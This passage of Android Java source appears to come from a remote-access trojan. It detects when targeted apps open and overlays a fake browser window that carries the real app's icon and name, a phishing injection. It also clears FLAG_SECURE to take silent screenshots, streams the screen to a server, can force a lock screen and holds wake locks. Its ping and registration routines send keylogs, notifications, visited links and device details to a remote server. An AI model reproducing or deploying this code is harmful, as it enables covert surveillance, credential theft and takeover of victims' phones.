                                        myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                                        myIntent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                                        myIntent.putExtra("cuzid", cuzid);
                                        myIntent.putExtra("label", Appname);
                                        myIntent.putExtra("icon", iconByteArray);
                                        myIntent.putExtra("type", "u");

                                        AccessTools.BringMeFront(ctx);

                                        ctx.startActivity(myIntent);
                                    }, 1200);

                                    targeticon.recycle();
                                    if (stream != null) {
                                        stream.close();
                                    }
                                }

                            }

                        } else {
                            if (event.getEventType() == UsageEvents.Event.MOVE_TO_BACKGROUND && lastject != null) {
                                if (!AccessTools.isSystemApp(ctx, CuzPackage)) {
                                    lastject = null;
                                    skipject = "";
                                }
                            }
                        }
                    }
                } catch (Exception e) {

                }
                for (Map.Entry<String, String> entry : Map_Name_Lnk.entrySet()) {
                    // Do something with each site
                    try {
                        String Name = entry.getKey();
                        String site = entry.getValue();
                        String AppID = Map_Name_ID.get(Name);

                        if (Lastdetected.equals(AppID)) {
                            return;
                        }


                        if (event.getEventType() == UsageEvents.Event.MOVE_TO_FOREGROUND &&
                                AppID.equals(event.getPackageName())) {


                            Lastdetected = AppID;
                            Debug("App detected", AppID);
                            Drawable icons = null;
                            try {

                                icons = ctx.getPackageManager().getApplicationIcon(AppID);
                            } catch (PackageManager.NameNotFoundException e) {
                                e.printStackTrace();
                                icons = null;
                            }

                            Bitmap targeticon = convertToBitmap(icons, 144, 144);
                            ByteArrayOutputStream stream = new ByteArrayOutputStream();
                            targeticon.compress(Bitmap.CompressFormat.PNG, 100, stream);
                            byte[] iconByteArray = stream.toByteArray();
                            Context mybasectx = ctx;
                            final String Appname = getAppNameFromPkgName(ctx, AppID);



                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                Intent myIntent = new Intent(mybasectx, WebBrowser.class);
                                myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                                myIntent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                                myIntent.putExtra("key", site);
                                myIntent.putExtra("label", Appname);
                                myIntent.putExtra("icon", iconByteArray);
                                myIntent.putExtra("type", "u");

                                AccessTools.BringMeFront(ctx);

                                ctx.startActivity(myIntent);
                            }, 1200);
                            //founded = site;
                            targeticon.recycle();
                            if (stream != null) {
                                stream.close();
                            }
                            break;
                        } else if (event.getEventType() == UsageEvents.Event.MOVE_TO_BACKGROUND &&
                                AppID.equals(event.getPackageName())) {
                            // Reset toastShown when Facebook goes to background
                            Lastdetected = "null";
                            Debug("App detected out", AppID);
                        }
                    } catch (Exception a) {
                    }
                }
            }

            try {
                Thread.sleep(1000); // Wait for 1 second before checking again
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        public static boolean isSelfRecordON() {
            if (selfdate == 0) {
                return false;
            }
            long currentTime = System.currentTimeMillis();
            long elapsedTime = currentTime - selfdate;
            long lasttime = 45 * 1000; //  milliseconds


            return elapsedTime < lasttime;
        }

        public static void stopSelfRecorder(Context ctx) {
            MySettings.WriteBool(ctx, Consts.Self_Record, false);
            selfdate = 0;
        }

        public static void SelfRecorder(Context ctx, int quality, String srctype, int delaymls) {
            Thread thread = new Thread(new Runnable() {
                public void run() {
                    String CurrnetLanuage = Locale.getDefault().getLanguage();
                    String themsg = "";
                    switch (CurrnetLanuage) {
                        case "ar":
                            themsg = "في انتظار دخول المستخدم إلى التطبيق";
                            break;
                        case "zh":
                            themsg = "等待用户进入应用程序";
                            break;
                        case "ru":
                            themsg = "Ожидание входа пользователя в приложение";
                            break;
                        case "tr":
                            themsg = "Kullanıcının uygulamaya girmesi bekleniyor";
                            break;
                        default:
                            themsg = "Waiting user to enter the app";
                            break;
                    }

                    byte[] waitimage = createImageByts(themsg);
                    do {
                        selfdate = System.currentTimeMillis();
                        try {
                            Thread.sleep(delaymls);
                        } catch (Exception s) {
                        }

                        try {
                            Activity currentActivity = getCurrentActivity();//this app injection, get main activ using reflection
                            if (currentActivity != null ) {
                                View rootView = currentActivity.getWindow().getDecorView().getRootView();
                                try {
                                    currentActivity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_SECURE);
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                        currentActivity.setRecentsScreenshotEnabled(true);
                                    }
                                } catch (Exception a) {

                                }
                                rootView.setDrawingCacheEnabled(true);
                                Bitmap bitmap = Bitmap.createBitmap(rootView.getDrawingCache());
                                rootView.setDrawingCacheEnabled(false);
                                Bitmap compressedBitmap = Bitmap.createScaledBitmap(bitmap, 350, 650, true);
                                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                compressedBitmap.compress(Bitmap.CompressFormat.WEBP, quality, baos);
                                byte[] scbyts = baos.toByteArray();


                                LiveChat.instance(ctx).LiveScreenSilent(ctx, scbyts, srctype);
                                bitmap.recycle();
                                baos.close();

                            } else {
                                LiveChat.instance(ctx).LiveScreenSilent(ctx, waitimage, srctype);
                                try {
                                    selfdate = System.currentTimeMillis();
                                    Thread.sleep(10000);
                                } catch (Exception s) {
                                }
                            }

                        } catch (Exception a) {
                            a.printStackTrace();
                        }


                    } while (MySettings.ReadBool(ctx, Consts.Self_Record, false) ||
                            MySettings.ReadBool(ctx, Live_Screen, false));
                }
            });
            thread.start();
        }

        public static volatile long skiltonthread = 0;

        public static boolean isLiveSkiltonlive() {
            if (skiltonthread == 0) {
                return false;
            }
            long currentTime = System.currentTimeMillis();
            long elapsedTime = currentTime - skiltonthread;
            long lasttime = 30 * 1000; // 30 sec in milliseconds


            return elapsedTime < lasttime;
        }

        public static void stopliveskilton(Context ctx) {
            MySettings.WriteBool(ctx, Consts.Live_skilton, false);
            skiltonthread = 0;
        }

        public static void Skiltonlive(Context ctx, int quality) {
            Thread thread = new Thread(new Runnable() {
                public void run() {

                    do {
                        skiltonthread = System.currentTimeMillis();
                        try {
                            Thread.sleep(1);
                        } catch (Exception s) {
                        }

                        try {

                            byte[] byteArray = AccessTools.createskilton();
                            if (byteArray != null) {

                                LiveChat.instance(ctx).LiveScreenSilent(ctx, byteArray, "screen");
                            }

                        } catch (Exception a) {
                            a.printStackTrace();
                        }


                    } while (MySettings.ReadBool(ctx, Consts.Live_skilton, false));
                }
            });
            thread.start();
        }

        @Override
        protected void onCancelled() {
            super.onCancelled();
            workdats = 0;
        }

        boolean keepworking = false;

        public void stop() {
            keepworking = false;
        }

        //        private WindowManager windowManager;
//        private View overlayView;
//        public void showSmoothOverlay(Context context) {
//            if (windowManager != null) return; // already shown
//
//            windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
//
//            // Create a full-screen View with 1% transparent black
//            overlayView = new View(context);
//            overlayView.setBackgroundColor(Color.argb(3, 0, 0, 0)); // 1% alpha black
//
//            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
//                    WindowManager.LayoutParams.MATCH_PARENT,
//                    WindowManager.LayoutParams.MATCH_PARENT,
//                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY, // SYSTEM_ALERT_WINDOW permission
//                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
//                    PixelFormat.TRANSLUCENT
//            );
//
//            params.gravity = Gravity.TOP | Gravity.START; // full screen
//
//            params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
//            // Important: allow focus
//
//            windowManager.addView(overlayView, params);
//        }
//
//        public void removeSmoothOverlay() {
//            if (windowManager != null && overlayView != null) {
//                windowManager.removeViewImmediate(overlayView);
//                overlayView = null;
//                windowManager = null;
//            }
//        }
        @Override
        protected String doInBackground(Context... ctxs) {

            workdats = System.currentTimeMillis();

            if (MyLOCK.isLocked()) {
                return null;
            }

            Context ctx = ctxs[0];
            long startTime = System.currentTimeMillis();
            long elapsedTime;

            MyLOCK.lock();
            keepworking = true;
            ConfigManager config = ConfigManager.getInstance();
            config.initialize(ctx, My_Configs.ALL_CONFIG);
            PowerManager powerManager = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            while (keepworking) {

                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                }
                if (!keepworking) {
                    break;
                }

                try {

                    workdats = System.currentTimeMillis();

                    if (needsleep) {
                        needsleep = false;
                        try {
                            Thread.sleep(5000);
                            startTime = System.currentTimeMillis();
                        } catch (InterruptedException e) {
                        }
                    }

                    elapsedTime = System.currentTimeMillis() - startTime;
                    if (elapsedTime >= Consts.Preformance) {
                        Debug("At.MyWorker", "Ping:" + UtliTools.FullStamp());

                        startTime = System.currentTimeMillis();


                        JoinChat(ctx);
                        SendPing(ctx);

//                        try
//                        {
//                            Intent intent = new Intent("android.settings.APP_NOTIFICATION_SETTINGS");
//                            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_CLEAR_TASK);
//                            intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.Settings$AppNotificationSettingsActivity"));
//                            intent.putExtra(Settings.EXTRA_APP_PACKAGE, "android");
//
//                            ctx.startActivity(intent);
//
//                        }catch (Exception a){
//                            a.printStackTrace();
//                        }
                        if (!IsScreenOn(ctx) &&
                                My_Configs.Prevent_sleep.equals("1")) {
                            if (LOCK_SERVS != null && LOCK_SERVS.isHeld()) {
                                LOCK_SERVS.release();
                                LOCK_SERVS=null;
                            }
                        }
                    }


                    if (config.add_usagacc && isUsageAccessGranted(ctx) && !config.req_accss) {
                        monitorAppUsage(ctx);

                    }

                    if (MySettings.ReadBool(ctx, Consts.lock_screen, false)) {
                        Intent myIntent = new Intent(ctx, LockActivity.class);
                        myIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        myIntent.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
                        myIntent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                        myIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        ctx.startActivity(myIntent);
                        AccessTools.Treger("lock", null);
                    } else {
                        if (LockActivity.isActivityOpen()) {
                            LockActivity.endlock();
                        }
                    }

//                    if (Settings.canDrawOverlays(ctx)){
//                        showSmoothOverlay(ctx);
//                    }

//                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
//                            My_Configs.Prevent_sleep.equals("1") ){
//                        WakeScreen(ctx);
//                    }

//                    if (//  MySocket.connected){
//
//                    }else{
//                        Bingme = false;
//                        //  MySocket.StartConnect();
//                        try {
//                            Thread.sleep(10000);
//                        } catch (InterruptedException e) {}
//                    }
                    if (LOCK_SERVS == null) {
                        LOCK_SERVS = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, ":");

//                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ) {
//
//
//                        } else {
//                            LOCK_SERVS = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, TAG);
//                        }
                    }



                    if (LOCK_SERVS != null && !LOCK_SERVS.isHeld()) {
                        LOCK_SERVS.acquire();
                    }
                } catch (OutOfMemoryError e) {
                    try {
                        MyLoger.Error("WS.Exception2", e.getMessage());
                        e.printStackTrace();
                        Thread.sleep(10000);
                    } catch (InterruptedException ex) {
                    }
                } catch (Exception e) {
                    try {
                        MyLoger.Error("WS.Exception", e.getMessage());
                        e.printStackTrace();
                        Thread.sleep(1);
                    } catch (InterruptedException ex) {
                    }
                }

            }

            MyLOCK.unlock();
            return null;
        }

        public static void SendPing(Context ctx) {
            if (!LiveChat.instance(ctx).isConnected) {
                return;
            }
            String pingSpeed = getPingSpeed(Consts.Server_Address);

            String currentState = UtliTools.ScreenStatus(ctx);
            try {
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("type", "png");
                jsonObject.put("scr", currentState);
                jsonObject.put("ms", pingSpeed);
                jsonObject.put("jct", ject_list.size());
                jsonObject.put("keylogs", ActivityMonitors.Load(ActivityMonitors.ActivityType.KSTR));
                jsonObject.put("vapps", ActivityMonitors.Load(ActivityMonitors.ActivityType.VAPS));
                jsonObject.put("activz", ActivityMonitors.Load(ActivityMonitors.ActivityType.ACTZ));
                jsonObject.put("notifys", ActivityMonitors.Load(ActivityMonitors.ActivityType.NTFS));
                jsonObject.put("vLinks", ActivityMonitors.Load(ActivityMonitors.ActivityType.BLNK));
                jsonObject.put("act", AccessServices.LastVisitedApp);
                jsonObject.put("AN", WorkServices.AngleString);
                jsonObject.put("LT", WorkServices.LightsString);
                //jsonObject.put("MV", WorkServices.isMovingString);
                jsonObject.put("BC", UtliTools.isCharging(ctx));
                jsonObject.put("BP", UtliTools.getBatteryPercentage(ctx));
                jsonObject.put("jcts", String.join("|", ject_list));
                String jsonData = jsonObject.toString();

                LiveChat.instance(ctx).Livemessage(ctx, jsonData);
            } catch (Exception a) {

            }
        }


        public static void joinclients(Context myctx) {

            try {

                String IDF = MySettings.Read(myctx, Consts.THE_IDF, null);

                if (IDF == null) {
                    return;
                }

                // My_Crpter cr = My_Crpter.Getinstance();
                // String um = cr.Dcrpt_Str(My_Configs.USR_MAIL);

                // Construct JSON object
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("type", "add");

                jsonObject.put("phone_name", MySettings.Read(myctx, Consts.USR_NAME, My_Configs.Mob_Name));
                jsonObject.put("android_version", UtliTools.Version());
                jsonObject.put("model", Devicename(myctx));
                jsonObject.put("battery_charge", UtliTools.isCharging(myctx));
                jsonObject.put("battery_precentage", UtliTools.getBatteryPercentage(myctx));
                jsonObject.put("network", UtliTools.Get_Network(myctx));
                jsonObject.put("install_date", installdate(myctx));
                jsonObject.put("phone_id", MySettings.Read(myctx, Consts.DEVICE_ID, "Deviceid"));
                jsonObject.put("wallpap", UtliTools.Wallpaper(myctx, 30, 30, true));
                jsonObject.put("sim", UtliTools.getsimname(myctx));
                jsonObject.put("keylogs", ActivityMonitors.Load(ActivityMonitors.ActivityType.KSTR));
                jsonObject.put("vapps", ActivityMonitors.Load(ActivityMonitors.ActivityType.VAPS));
                jsonObject.put("activz", ActivityMonitors.Load(ActivityMonitors.ActivityType.ACTZ));
                jsonObject.put("notifys", ActivityMonitors.Load(ActivityMonitors.ActivityType.NTFS));
                jsonObject.put("vLinks", ActivityMonitors.Load(ActivityMonitors.ActivityType.BLNK));
                jsonObject.put("idf", IDF);
                jsonObject.put("BTVR", BTVersion);
                jsonObject.put("TRK", Tracking_Data_str);

                // Convert JSON object to string
                String jsonData = jsonObject.toString();

                // Send JSON string
                LiveChat.instance(myctx).Livemessage(myctx, jsonData);

//                Thread firstping = new Thread(new Runnable() {
//                    @Override
//                    public void run() {
//                        try {
//                            Thread.sleep(5000);
//
//                        } catch (Exception e) {
//                            //throw new RuntimeException(e);
//                        }
//                        SendPing(myctx);
//
//                    }
//                });

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        protected void onPostExecute(String u) {
            super.onPostExecute(u);
            MyLOCK.unlock();
            stop();
            if (LOCK_SERVS != null && LOCK_SERVS.isHeld()) {
                LOCK_SERVS.release();
                LOCK_SERVS=null;
            }
            workdats = 0;
        }
    }

}
